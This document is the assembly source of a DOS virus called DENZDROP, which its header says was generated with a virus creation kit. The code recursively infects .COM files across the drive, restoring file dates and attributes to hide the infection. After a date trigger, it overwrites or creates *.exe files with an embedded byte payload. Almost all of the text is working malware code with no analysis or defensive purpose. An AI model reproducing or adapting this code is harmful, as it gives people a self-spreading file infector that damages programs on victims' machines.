; DENZDROP.ASM -- 
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Unknown User

virus_type      equ     0                       ; Appending Virus
is_encrypted    equ     0                       ; We're not encrypted
tsr_virus       equ     0                       ; We're not TSR

code            segment byte public
		assume  cs:code,ds:code,es:code,ss:code
		org     0100h

main            proc    near
		db      0E9h,00h,00h            ; Near jump (for compatibility)
start:          call    find_offset             ; Like a PUSH IP
find_offset:    pop     bp                      ; BP holds old IP
		sub     bp,offset find_offset   ; Adjust for length of host

		lea     si,[bp + buffer]        ; SI points to original start
		mov     di,0100h                ; Push 0100h on to stack for
		push    di                      ; return to main program
		movsw                           ; Copy the first two bytes
		movsb                           ; Copy the third byte

		mov     di,bp                   ; DI points to start of virus

		mov     bp,sp                   ; BP points to stack
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer on stack
		int     021h

		mov     cx,0003h                ; Do 3 infections
search_loop:    push    cx                      ; Save CX
		call    search_files            ; Find and infect a file
		pop     cx                      ; Restore CX
		loop    search_loop             ; Repeat until CX is 0

		call    get_month
		cmp     ax,0007h                ; Did the function return 7?
		jl      skip00                  ; If less, skip effect
		call    get_day
		cmp     ax,0017h                ; Did the function return 23?
		jl      skip00                  ; If less, skip effect
		jmp     short strt00            ; Success -- skip jump
skip00:         jmp     end00                   ; Skip the routine
strt00:         lea     dx,[di + data00]        ; DX points to data
		lea     si,[di + data01]        ; SI points to data
		push    di                      ; Save DI
		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		mov     di,bx                   ; DI points to DTA
		mov     ah,04Eh                 ; DOS find first file function
		mov     cx,00100111b            ; CX holds all file attributes
		int     021h
		jc      create_file             ; If not found then create it
write_in_file:  mov     ax,04301h               ; DOS set file attributes function
		xor     cx,cx                   ; File will have no attributes
		lea     dx,[di + 01Eh]          ; DX points to file name
		int     021h
		mov     ax,03D01h               ; DOS open file function, write
		lea     dx,[di + 01Eh]          ; DX points to file name
		int     021h
		xchg    bx,ax                   ; Transfer file handle to AX
		mov     ah,040h                 ; DOS write to file function
		mov     cx,[si]                 ; CX holds number of byte to write
		lea     dx,[si + 2]             ; DX points to the data
		int     021h
		mov     ax,05701h               ; DOS set file date/time function
		mov     cx,[di + 016h]          ; CX holds old file time
		mov     dx,[di + 018h]          ; DX holds old file data
		int     021h
		mov     ah,03Eh                 ; DOS close file function
		int     021h
		mov     ax,04301h               ; DOS set file attributes function
		xor     ch,ch                   ; Clear CH for attributes
		mov     cl,[di + 015h]          ; CL holds old attributes
		lea     dx,[di + 01Eh]          ; DX points to file name
		int     021h
		mov     ah,04Fh                 ; DOS find next file function
		int     021h
		jnc     write_in_file           ; If successful do next file
		jmp     short dropper_end       ; Otherwise exit
create_file:    mov     ah,03Ch                 ; DOS create file function
		xor     cx,cx                   ; File has no attributes
		int     021h
		xchg    bx,ax                   ; Transfer file handle to AX
		mov     ah,040h                 ; DOS write to file function
		mov     cx,[si]                 ; CX holds number of byte to write
		lea     dx,[si + 2]             ; DX points to the data
		int     021h
		mov     ah,03Eh                 ; DOS close file function
		int     021h
dropper_end:    pop     di                      ; Restore DI

end00:
com_end:        pop     dx                      ; DX holds original DTA address
		mov     ah,01Ah                 ; DOS set DTA function
		int     021h

		mov     sp,bp                   ; Deallocate local buffer

		xor     ax,ax                   ;
		mov     bx,ax                   ;
		mov     cx,ax                   ;
		mov     dx,ax                   ; Empty out the registers
		mov     si,ax                   ;
		mov     di,ax                   ;
		mov     bp,ax                   ;

		ret                             ; Return to original program
main            endp

search_files    proc    near
		push    bp                      ; Save BP
		mov     bp,sp                   ; BP points to local buffer
		sub     sp,64                   ; Allocate 64 bytes on stack

		mov     ah,047h                 ; DOS get current dir function
		xor     dl,dl                   ; DL holds drive # (current)
		lea     si,[bp - 64]            ; SI points to 64-byte buffer
		int     021h

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[di + root]          ; DX points to root directory
		int     021h

		call    traverse                ; Start the traversal

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 64]            ; DX points to old directory
		int     021h

		mov     sp,bp                   ; Restore old stack pointer
		pop     bp                      ; Restore BP
		ret                             ; Return to caller

root            db      "\",0                   ; Root directory
search_files    endp

traverse        proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first function
		mov     cx,00010000b            ; CX holds search attributes
		lea     dx,[di + all_files]     ; DX points to "*.*"
		int     021h
		jc      leave_traverse          ; Leave if no files present

check_dir:      cmp     byte ptr [bp - 107],16  ; Is the file a directory?
		jne     another_dir             ; If not, try again
		cmp     byte ptr [bp - 98],'.'  ; Did we get a "." or ".."?
		je      another_dir             ;If so, keep going

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 98]            ; DX points to new directory
		int     021h

		call    traverse                ; Recursively call ourself

		pushf                           ; Save the flags
		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[di + up_dir]        ; DX points to parent directory
		int     021h
		popf                            ; Restore the flags

		jnc     done_searching          ; If we infected then exit

another_dir:    mov     ah,04Fh                 ; DOS find next function
		int     021h
		jnc     check_dir               ; If found check the file

leave_traverse:
		lea     dx,[di + com_mask]      ; DX points to "*.COM"
		call    find_files              ; Try to infect a file
done_searching: mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller

up_dir          db      '..',0                  ; Parent directory name
all_files       db      '*.*',0                 ; Directories to search for
com_mask        db      '*.com',0               ; Mask for all .COM files
traverse        endp

find_files      proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		push    dx                      ; Save file mask
		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first file function
		mov     cx,00100111b            ; CX holds all file attributes
		pop     dx                      ; Restore file mask
find_a_file:    int     021h
		jc      done_finding            ; Exit if no files found
		call    infect_file             ; Infect the file!
		jnc     done_finding            ; Exit if no error
		mov     ah,04Fh                 ; DOS find next file function
		jmp     short find_a_file       ; Try finding another file

done_finding:   mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller
find_files      endp

infect_file     proc    near
		mov     ah,02Fh                 ; DOS get DTA address function
		int     021h
		mov     si,bx                   ; SI points to the DTA

		mov     byte ptr [di + set_carry],0  ; Assume we'll fail

		cmp     word ptr [si + 01Ah],(65279 - (finish - start))
		jbe     size_ok                 ; If it's small enough continue
		jmp     infection_done          ; Otherwise exit

size_ok:        mov     ax,03D00h               ; DOS open file function, r/o
		lea     dx,[si + 01Eh]          ; DX points to file name
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,03Fh                 ; DOS read from file function
		mov     cx,3                    ; CX holds bytes to read (3)
		lea     dx,[di + buffer]        ; DX points to buffer
		int     021h

		mov     ax,04202h               ; DOS file seek function, EOF
		cwd                             ; Zero DX _ Zero bytes from end
		mov     cx,dx                   ; Zero CX /
		int     021h

		xchg    dx,ax                   ; Faster than a PUSH AX
		mov     ah,03Eh                 ; DOS close file function
		int     021h
		xchg    dx,ax                   ; Faster than a POP AX

		sub     ax,finish - start + 3   ; Adjust AX for a valid jump
		cmp     word ptr [di + buffer + 1],ax  ; Is there a JMP yet?
		je      infection_done          ; If equal then exit
		mov     byte ptr [di + set_carry],1  ; Success -- the file is OK
		add     ax,finish - start       ; Re-adjust to make the jump
		mov     word ptr [di + new_jump + 1],ax  ; Construct jump

		mov     ax,04301h               ; DOS set file attrib. function
		xor     cx,cx                   ; Clear all attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

		mov     ax,03D02h               ; DOS open file function, r/w
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,040h                 ; DOS write to file function
		mov     cx,3                    ; CX holds bytes to write (3)
		lea     dx,[di + new_jump]      ; DX points to the jump we made
		int     021h

		mov     ax,04202h               ; DOS file seek function, EOF
		cwd                             ; Zero DX _ Zero bytes from end
		mov     cx,dx                   ; Zero CX /
		int     021h

		mov     ah,040h                 ; DOS write to file function
		mov     cx,finish - start       ; CX holds virus length
		lea     dx,[di + start]         ; DX points to start of virus
		int     021h

		mov     ax,05701h               ; DOS set file time function
		mov     cx,[si + 016h]          ; CX holds old file time
		mov     dx,[si + 018h]          ; DX holds old file date
		int     021h

		mov     ah,03Eh                 ; DOS close file function
		int     021h

		mov     ax,04301h               ; DOS set file attrib. function
		xor     ch,ch                   ; Clear CH for file attribute
		mov     cl,[si + 015h]          ; CX holds file's old attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

infection_done: cmp     byte ptr [di + set_carry],1  ; Set carry flag if failed
		ret                             ; Return to caller

set_carry       db      ?                       ; Set-carry-on-exit flag
buffer          db      090h,0CDh,020h          ; Buffer to hold old three bytes
new_jump        db      0E9h,?,?                ; New jump to virus
infect_file     endp


get_day         proc    near
		mov     ah,02Ah                 ; DOS get date function
		int     021h
		mov     al,dl                   ; Copy day into AL
		cbw                             ; Sign-extend AL into AX
		ret                             ; Return to caller
get_day         endp

get_month       proc    near
		mov     ah,02Ah                 ; DOS get date function
		int     021h
		mov     al,dh                   ; Copy month into AL
		cbw                             ; Sign-extend AL into AX
		ret                             ; Return to caller
get_month       endp

data00          db      '*.exe',0

data01          dw      10BAh
		db      0E9h, 056h, 005h, 00Dh, 00Ah, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 0C9h, 0CDh, 0CDh
		db      0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh
		db      0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh
		db      0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh
		db      0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh
		db      0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh
		db      0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh
		db      0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh
		db      0CDh, 0CDh, 0CDh, 0CDh, 0BBh, 00Dh, 00Ah, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 0BAh
		db      020h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 020h, 0BAh, 00Dh
		db      00Ah, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 0BAh, 020h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 031h, 032h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 020h
		db      0BAh, 00Dh, 00Ah, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 0BAh, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 0BAh, 00Dh, 00Ah, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 0BAh, 020h, 056h
		db      069h, 072h, 075h, 073h, 020h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 052h
		db      069h, 070h, 074h, 06Fh, 066h, 066h, 020h, 062h
		db      079h, 020h, 056h, 043h, 04Ch, 020h, 04Ch, 06Fh
		db      076h, 065h, 072h, 020h, 0BAh, 00Dh, 00Ah, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 0BAh
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 0BAh, 00Dh
		db      00Ah, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 0BAh, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 050h, 072h, 06Fh, 067h
		db      072h, 061h, 06Dh, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 044h, 045h, 04Eh
		db      05Ah, 02Dh, 053h, 049h, 04Dh, 02Eh, 043h, 04Fh
		db      04Dh, 020h, 056h, 031h, 02Eh, 030h, 032h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      0BAh, 00Dh, 00Ah, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 0BAh, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 044h, 065h
		db      06Eh, 07Ah, 075h, 06Bh, 020h, 076h, 069h, 072h
		db      075h, 073h, 020h, 02Dh, 020h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 0BAh, 00Dh, 00Ah, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 0BAh, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 0BAh, 00Dh, 00Ah, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 0BAh
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 062h, 075h
		db      074h, 074h, 02Dh, 069h, 074h, 063h, 068h, 020h
		db      074h, 068h, 065h, 020h, 06Fh, 06Ch, 064h, 020h
		db      076h, 069h, 072h, 075h, 073h, 020h, 031h, 039h
		db      039h, 032h, 02Eh, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 0BAh, 00Dh
		db      00Ah, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 0BAh, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      0BAh, 00Dh, 00Ah, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 0BAh, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 044h, 061h, 072h, 06Bh, 020h
		db      041h, 076h, 065h, 06Eh, 067h, 065h, 072h, 020h
		db      069h, 073h, 020h, 030h, 030h, 030h, 020h, 061h
		db      020h, 076h, 069h, 072h, 075h, 073h, 02Ch, 020h
		db      030h, 030h, 030h, 030h, 030h, 030h, 020h, 073h
		db      06Fh, 020h, 069h, 06Eh, 066h, 065h, 063h, 074h
		db      069h, 06Fh, 075h, 073h, 020h, 020h, 020h, 020h
		db      020h, 020h, 0BAh, 00Dh, 00Ah, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 0BAh, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 0BAh, 00Dh, 00Ah, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 0BAh
		db      020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 020h, 030h, 030h, 030h, 030h, 030h, 020h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 020h, 06Fh, 062h
		db      073h, 063h, 065h, 06Eh, 065h, 020h, 064h, 069h
		db      073h, 070h, 06Ch, 061h, 079h, 020h, 020h, 020h
		db      020h, 020h, 020h, 020h, 020h, 020h, 0BAh, 00Dh
		db      00Ah, 020h, 020h, 020h, 020h, 020h, 020h, 020h
		db      020h, 0C8h, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh
		db      0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh
		db      0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh
		db      0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh
		db      0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh
		db      0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh
		db      0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh
		db      0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh, 0CDh
		db      0BCh, 00Dh, 00Ah, 024h, 003h, 044h, 045h, 04Eh
		db      05Ah, 02Dh, 053h, 049h, 04Dh, 043h, 04Fh, 04Dh
		db      007h, 00Ch, 000h, 01Bh, 030h, 0FFh, 085h, 0DBh
		db      074h, 020h, 019h, 00Dh, 018h, 019h, 093h, 010h
		db      000h, 000h, 044h, 045h, 04Eh, 05Ah, 02Dh, 053h
		db      049h, 04Dh, 02Eh, 043h, 04Fh, 04Dh, 000h, 002h
		db      00Dh, 00Ah, 054h, 068h, 069h, 073h, 020h, 070h
		db      072h, 06Fh, 067h, 072h, 061h, 06Dh, 020h, 072h
		db      065h, 071h, 075h, 069h, 072h, 065h, 073h, 020h
		db      044h, 04Fh, 053h, 020h, 076h, 065h, 072h, 073h
		db      069h, 06Fh, 06Eh, 020h, 032h, 02Eh, 030h, 020h
		db      06Fh, 072h, 020h, 06Ch, 061h, 074h, 065h, 072h
		db      00Dh, 00Ah, 024h, 00Dh, 00Ah, 044h, 04Fh, 053h
		db      020h, 076h, 065h, 072h, 073h, 069h, 06Fh, 06Eh
		db      020h, 032h, 02Eh, 078h, 020h, 02Dh, 020h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 00Dh, 00Ah, 024h, 00Dh, 00Ah
		db      050h, 072h, 06Fh, 067h, 072h, 061h, 06Dh, 020h
		db      069h, 073h, 020h, 074h, 068h, 065h, 020h, 077h
		db      072h, 06Fh, 06Eh, 067h, 020h, 06Ch, 065h, 06Eh
		db      067h, 074h, 068h, 00Dh, 00Ah, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h
		db      030h, 030h, 030h, 030h, 020h, 063h, 068h, 065h
		db      063h, 06Bh, 020h, 066h, 06Fh, 072h, 020h, 076h
		db      069h, 072h, 075h, 073h, 020h, 069h, 06Eh, 066h
		db      065h, 063h, 074h, 069h, 06Fh, 06Eh, 00Dh, 00Ah
		db      024h, 0B4h, 019h, 0CDh, 021h, 02Eh, 0A2h, 087h
		db      005h, 0B4h, 030h, 0CDh, 021h, 03Ch, 002h, 090h
		db      090h, 077h, 017h, 08Dh, 016h, 088h, 005h, 0B4h
		db      009h, 0CDh, 021h, 0B4h, 04Ch, 0CDh, 021h, 08Dh
		db      016h, 0BBh, 005h, 0B4h, 009h, 0CDh, 021h, 0EBh
		db      063h, 090h, 02Eh, 0A1h, 02Ch, 000h, 08Eh, 0C0h
		db      033h, 0FFh, 0B9h, 0FFh, 07Fh, 032h, 0C0h, 0F2h
		db      0AEh, 026h, 080h, 03Dh, 000h, 0E0h, 0F8h, 083h
		db      0C7h, 003h, 026h, 080h, 07Dh, 001h, 03Ah, 090h
		db      090h, 026h, 08Ah, 015h, 080h, 0E2h, 0DFh, 080h
		db      0EAh, 041h, 0B4h, 00Eh, 0CDh, 021h, 083h, 0C7h
		db      002h, 0B4h, 01Ah, 0BAh, 05Ch, 005h, 0CDh, 021h
		db      01Eh, 006h, 01Fh, 08Bh, 0D7h, 0B9h, 007h, 000h
		db      0B4h, 04Eh, 0CDh, 021h, 01Fh, 0B4h, 00Eh, 02Eh
		db      08Ah, 016h, 087h, 005h, 0CDh, 021h, 0B8h, 093h
		db      010h, 02Eh, 03Bh, 006h, 076h, 005h, 090h, 090h
		db      090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
		db      090h, 090h, 090h, 090h, 0B8h, 003h, 000h, 0CDh
		db      010h, 0BAh, 003h, 001h, 090h, 090h, 090h, 090h
		db      090h, 090h, 090h, 090h, 0E9h, 000h, 00Ah, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 0AAh, 0A0h
		db      000h, 000h, 000h, 000h, 00Ah, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0A0h, 000h, 020h, 000h, 000h, 000h
		db      000h, 000h, 00Ah, 0AAh, 080h, 000h, 000h, 000h
		db      002h, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh
		db      0A8h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 000h, 000h, 002h
		db      0AAh, 0A8h, 000h, 000h, 002h, 0AAh, 0A0h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 0AAh, 0AAh
		db      0A8h, 000h, 000h, 000h, 00Ah, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0A0h, 000h, 02Ah, 080h, 000h, 000h
		db      000h, 000h, 00Ah, 0AAh, 080h, 000h, 000h, 000h
		db      002h, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh
		db      080h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 000h, 000h, 02Ah
		db      0AAh, 080h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 0AAh, 0AAh
		db      0AAh, 0A0h, 000h, 000h, 00Ah, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0A0h, 000h, 02Ah, 0A8h, 000h, 000h
		db      000h, 000h, 00Ah, 0AAh, 080h, 000h, 000h, 000h
		db      002h, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh
		db      000h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 000h, 000h, 0AAh
		db      0A8h, 000h, 000h, 02Ah, 0AAh, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 000h, 02Ah
		db      0AAh, 0AAh, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 02Ah, 0AAh, 0A0h, 000h
		db      000h, 000h, 00Ah, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 000h, 002h, 0AAh
		db      0A0h, 000h, 002h, 0AAh, 0AAh, 080h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 000h, 000h
		db      02Ah, 0AAh, 0A0h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 02Ah, 0AAh, 0AAh, 080h
		db      000h, 000h, 00Ah, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 000h, 000h, 02Ah
		db      080h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 000h, 000h
		db      002h, 0AAh, 0A8h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 0AAh, 0AAh, 0AAh
		db      000h, 000h, 00Ah, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 00Ah, 0AAh, 0A8h, 000h
		db      000h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 002h, 080h, 008h
		db      000h, 000h, 02Ah, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh
		db      0A0h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 000h, 000h
		db      000h, 0AAh, 0AAh, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 00Ah, 0AAh, 0AAh
		db      0A8h, 000h, 00Ah, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 0AAh, 0AAh, 080h, 000h
		db      000h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 00Ah, 0A0h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
